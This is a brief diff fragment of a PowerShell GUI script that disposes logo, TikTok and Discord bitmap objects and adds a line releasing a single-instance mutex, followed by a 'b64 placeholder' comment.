 if ($script:logoBmp) { $script:logoBmp.Dispose() };if ($script:tiktokBmp) { $script:tiktokBmp.Dispose() };if ($script:discordBmp) { $script:discordBmp.Dispose() };if ($ib) { $ib.Dispose() }
+if ($script:singleMutex) { try { $script:singleMutex.ReleaseMutex(); $script:singleMutex.Dispose() } catch {} }
 
 
 # b64 placeholder
